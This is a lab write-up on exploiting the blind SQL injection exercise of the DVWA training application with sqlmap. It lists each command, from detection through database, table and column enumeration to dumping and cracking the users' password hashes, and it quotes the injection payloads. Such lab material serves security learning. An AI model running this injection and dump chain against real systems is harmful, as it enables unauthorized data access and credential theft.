# [Blind SQL Injection](http://localhost/vulnerabilities/sqli_blind/)

Being already very familiar with Blind SQL Injection and using it to 
exfiltrate information bit by bit by analyzing the response. I have 
written my own scripts in the past but decided to learn how to use some 
automated tooling. In this case `sqlmap`

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7;security=low"`

This analyzes our target for vulnerabilities. And we get this:

> ---
> Parameter: id (GET)
>    Type: boolean-based blind
>    Title: AND boolean-based blind - WHERE or HAVING clause
>    Payload: id=2' AND 3933=3933 AND 'FayX'='FayX&Submit=Submit
>
>    Type: time-based blind
>    Title: MySQL >= 5.0.12 AND time-based blind
>    Payload: id=2' AND SLEEP(5) AND 'ViUQ'='ViUQ&Submit=Submit
> ---

So the `id` parameter is vulnerable. We can reveal database names using `--dbs`

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7;security=low" --dbs`

> available databases [2]:
> [*] dvwa
> [*] information_schema

We can list all the tables in the database `dvwa`

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7;security=low" -D dvwa --tables`

> Database: dvwa
> [2 tables]
> +-----------+
> | guestbook |
> | users     |
> +-----------+

We can list the columns in the `users` table.

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7;security=low" -T users --columns`

> Table: users
> [8 columns]
> +--------------+-------------+
> | Column       | Type        |
> +--------------+-------------+
> | user         | varchar(15) |
> | avatar       | varchar(70) |
> | failed_login | int(3)      |
> | first_name   | varchar(15) |
> | last_login   | timestamp   |
> | last_name    | varchar(15) |
> | password     | varchar(32) |
> | user_id      | int(6)      |
> +--------------+-------------+

Finally we can dump all the usernames and passwords

`sqlmap -u "http://192.168.1.78/vulnerabilities/sqli_blind/?id=2&Submit=Submit#" --cookie="PHPSESSID=ga31evahqau62n6qp1vitpm5u7;security=low" -C user,password --dump`

`sqlmap` can even crack the hashes using a dictionary attack!

> +---------+---------------------------------------------+
> | user    | password                                    |
> +---------+---------------------------------------------+
> | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
> | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
> | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
> | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
> | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
> +---------+---------------------------------------------+

How cool is that? Just goes to show how powerful some of these tools are although 
I am extremely glad that I know "how" the tool works instead of just running a tool 
and letting it do all the work!


